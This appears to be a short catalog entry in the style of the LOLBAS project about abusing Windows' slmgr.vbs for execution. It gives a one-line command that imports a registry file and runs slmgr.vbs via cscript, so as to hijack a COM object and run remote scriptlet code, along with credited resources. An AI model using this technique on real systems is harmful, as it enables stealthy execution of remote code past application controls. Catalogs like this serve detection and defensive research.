## Slmgr.vbs
* Functions: Execute
```

reg.exe import c:\path\to\Slmgr.reg & cscript.exe /b c:\windows\system32\slmgr.vbs
Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code.
```
   
* Resources:   
  * https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
  * https://www.youtube.com/watch?v=3gz1QmiMhss
   
* Full path:   
  * c:\windows\system32\slmgr.vbs
  * c:\windows\sysWOW64\slmgr.vbs
   
* Notes: Thanks to Matt Nelson - @enigma0x3, Casey Smith - @subTee  
   
